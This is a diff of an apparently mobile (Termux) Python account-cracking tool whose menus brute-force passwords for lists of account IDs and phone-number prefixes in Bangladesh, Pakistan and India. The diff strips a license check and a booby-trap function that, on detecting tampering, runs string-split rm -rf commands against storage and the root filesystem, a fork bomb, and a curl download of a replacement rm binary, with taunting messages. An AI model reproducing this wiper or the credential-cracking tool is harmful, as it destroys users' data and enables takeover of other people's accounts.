@@ -176,25 +176,8 @@ else:print(f"{style} {note} ");exit()
 #-------------------------(MAIN MENU)------------------------->>>
 def ___R_E_F_A_T___():
     global lim
-    clear();##verify();iamcheckingyou()
-    try:
-        key = open('/data'+'/data/com'+'.termux/fi'+'les/usr/bi'+'n/.tmrnu'+'nucoto.txt','r').read()
-    except FileNotFoundError: 
-        key = str(input(f"{style} P"+"UT L"+"ICE"+f"NSE {RE}●{G} "))
-    result = Key.activate(token=auth,\
-    rsa_pub_key=OkLic,\
-    product_id=23545, \
-    key=key,\
-    machine_code=Helpers.GetMachineCode())
-    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
-        clear()
-        print(f"{style} Yo"+"ur Lice"+"nse Ex"+"pired Cont"+"act Adm"+"in....");time.sleep(3);os.system("rm /data"+"/data/c"+"om.te"+"rmux/file"+"s/usr/bin/.tmr"+"nunuc"+"oto.txt");wash("xdg-open https:/"+"/"+"app.com/LJk2V"+"t0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
-    else:
-        clear()
-        license_key = result[0]
-        with open('/data'+'/dat'+'a/com.te'+'rmux/file'+'s/usr/bin/.'+'tmrnunu'+'coto.txt','w') as f:
-            f.write(key)
-    print(f"{L}[\033[01m\033[94;1m\033[47m USEAGE ● TOOL ON"+"LY WORK MO"+"BILE DA"+f"TA \033[40m{L}]")
+    clear()
+    
     _________linex_________()
     print(f"{style} LICENSE EXPIRE{K} ●{Y} " +str(license_key.expires))
     _________linex_________()
@@ -215,7 +198,7 @@ def ___R_E_F_A_T___():
 #-------------------------(FILE CRACKING METHOD MENU)------------------------->>>
 def __Ok_XoXu__():
     global methods        
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{G}[{R}A{G}]{X}_{Y}_{Z}>{G0} METHOD {G0}[{Y}<{U}({B}1{U}){Y}>{G0}] {V}[{T}<{Q} F{P}<{O}>{N}MIX{M} >{V}]')
     print(f'{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} METHOD {G1}[{Y}<{U}({B}2{U}){Y}>{G1}] {V}[{T}<{Q} F{P}<{O}>{N}MIX{M} >{V}]')
     print(f'{G}[{R}C{G}]{X}_{Y}_{Z}>{G2} METHOD {G2}[{Y}<{U}({B}3{U}){Y}>{G2}] {V}[{T}<{Q} M{P}<{O}>{N}MIX{M} >{V}]')
@@ -237,7 +220,7 @@ class main_crack():
         self.id=[]
     def crack(self,id):
         global methods
-        clear();__durmagi__();##verify();iamcheckingyou()
+        clear();__durmagi__()
         self.file = input(f"{style} FILE PATH   {RE}●{G} ")
         try:
             self.id = open(self.file).read().splitlines()
@@ -253,7 +236,7 @@ class main_crack():
             main_crack().crack(id)
 #-------------------------(FILE CLONER PASSWORD)-------------------------
     def pasw(self):
-            clear();__durmagi__();##verify();iamcheckingyou()
+            clear();__durmagi__()
             print(f' {G}[{R}1{G}] AUTO 18 PASS CRACK {W}[{Y}BD{W}]\n {G}[{R}2{G}] CUSTOM PASS CRACK {W}[{Y}CUSTOM{W}]\n {G}[{R}3{G}] AUTO 06 PASS CRACK {W}[{Y}IND{W}]\n {G}[{R}4{G}] AUTO 16 PASS CRACK {W}[{Y}BD{W}]\n {G}[{R}5{G}] AUTO 07 PASS CRACK {W}[{Y}BHUTAN{W}]\n {G}[{R}6{G}] AUTO 10 PASS CRACK {W}[{Y}NEPAL{W}]\n {G}[{R}7{G}] AUTO 14 PASS CRACK {W}[{Y}BD-DIGIT{W}]')
             _________linex_________()
             ppp=input(f' {style} CHOOSE PASS {RE}●{G} ')
@@ -464,7 +447,7 @@ class main_crack():
 """-------------------------(RANDOM MAIN MENU)-------------------------"""
 def randommenu():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f"{G1}[{R}A{G1}]{X}_{Y}_{Z}>{G1} AUT"+"O PASS"+f"WORD             {G1}[{Y}BE"+f"ST{G1}]")
     print(f"{G2}[{R}B{G2}]{X}_{Y}_{Z}>{G2} CUS"+"TOM PASSW"+f"ORD            {G2}[{Y}NE"+f"W{G2}]")
     print(f"{G3}[{R}C{G3}]{X}_{Y}_{Z}>{G3} M"+"AIN ME"+f"NU                 {G3}[{Y}BA"+f"CK{G3}]")
@@ -478,7 +461,7 @@ def randommenu():
 """-------------------------(RANDOM MENU)-------------------------"""
 def Random():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} BANGL"+"ADESH CRAC"+"KING")
     print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} PAKIS"+"TAN CRAC"+"KING")
     print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} IND"+"IA CRA"+"CKING")
@@ -494,7 +477,7 @@ def Random():
 """-------------------------(CUSTOM PASS)-------------------------"""
 def ___ChoicePass___():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f"{L}[\033[01m\033[94;1m\033[47m ENTER YOUR SIM FIRST FOUR DIGIT CODE\033[40m{L}]")
     _________linex_________()
     print(f"{style} EXA"+f"MPLE BD  {RE}●{G} +880"+"161,+880"+"172,+8801"+"83")
@@ -559,7 +542,7 @@ def ___ChoicePass___():
 """-------------------------(BD CRACKING)-------------------------"""
 def ___Bangladesh___():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{style} EXAMPLE     {RE}●{G} 016 017 018 019')
     _________linex_________()
     kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
@@ -605,7 +588,7 @@ def ___Bangladesh___():
 """-------------------------(PAK CRACKING)-------------------------"""
 def ___Pakistan___():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{style} EXAMPLE     {RE}●{G} 0306 0315 0335 0345')
     _________linex_________()
     kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
@@ -649,7 +632,7 @@ def ___Pakistan___():
 """-------------------------(IND CRACKING)-------------------------"""
 def ___India___():
     global lim
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{style} EXAMPLE     {RE}●{G} +91620 +91639 +91950')
     _________linex_________()
     kode = input(f'{style} CHOOSE CODE {RE}●{G} ')
@@ -692,7 +675,7 @@ def ___India___():
     input(f"{style} PRESS ENTER TO BACK ORIGINAL MENU....!");___R_E_F_A_T___()
 """-------------------------(FILE MAKE MAIN MENU)-------------------------"""
 def Filemake():
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f"{G}[{R}A{G}]{X}_{Y}_{Z}>{G} FILE SEPERATE")
     print(f"{G1}[{R}B{G1}]{X}_{Y}_{Z}>{G1} DUPLICATE REMOVER")
     print(f"{G2}[{R}C{G2}]{X}_{Y}_{Z}>{G2} REMOVE USED LINKS {W}({G2}txt{W})")
@@ -707,7 +690,7 @@ def Filemake():
     else:print(f'{style} SELECT VALID OPTION..... ');time.sleep(2);Filemake()
 """-------------------------(FILE SEPARATE)-------------------------"""
 def Seprate():
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     try:
         print(f"{style} EXAMPLE     {RE}●{G4} 1 , 2 , 3 , 5 , 10");_________linex_________()
         limit = int(input(f'{style} HOW LINKS   {RE}●{G} '))
@@ -722,7 +705,7 @@ def Seprate():
     input(f'{style} PRESS ENTER TO BACK MAIN MENU ');___R_E_F_A_T___()
 """-------------------------(DUPLICATE REMOVER)-------------------------"""
 def Duplicate():
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
     file_path = input(f"{style} ENTER FILE  {RE}●{G} ")
     with open(file_path, "r") as file:
@@ -734,7 +717,7 @@ def Duplicate():
     input(f"{style} PRESS ENTER TO BACK MAIN MENU");___R_E_F_A_T___()
 """-------------------------(USED LINK REMOVER)-------------------------"""
 def _____Used___Link___Remover_____():
-    clear();__durmagi__();##verify();iamcheckingyou()
+    clear();__durmagi__()
     print(f'{style} EXAMPLE     {RE}●{G} /sdcard/oldfile.txt');_________linex_________()
     refatinput1 = input(f"{style} FILE PATH   {RE}●{G} ")
     try:
@@ -860,28 +843,10 @@ def issue():
     else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed Wa'+'rning By Mr Top');exit()
     if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.11"):pass
     else:system('clear');print(f'{style} Sys'+'tem Modific'+'ation N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
-def iamcheckingyou():
-    with open(f'{site}requests/sessions.py', 'r') as file :
-        filedata63 = file.read()
-    #if "##verify = False" in filedata63:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-    #else:pass
-    with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
-        filedata47 = file7i7.read()
-    #if str("cert_reqs = 'CERT_NONE'") in filedata47:wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
-#def ##verify():
-    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
-            filedata = file.read()
-    filedata = filedata.replace('##verify = False', '##verify = True')
-    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
-        file.write(filedata)
-    if "##verify = True" in filedata:pass
-    else:
-        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
-            file.write('\n##verify = True\n')
-    pass
+
 """-------------------------(DEFINE AND RUN TOOL)-------------------------"""
 if __name__=='___main___':
-    try:issue();iamcheckingyou();##verify();rsbuy()
+    try:issue();rsbuy()
     except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
     except:exit()
 ___R_E_F_A_T___()
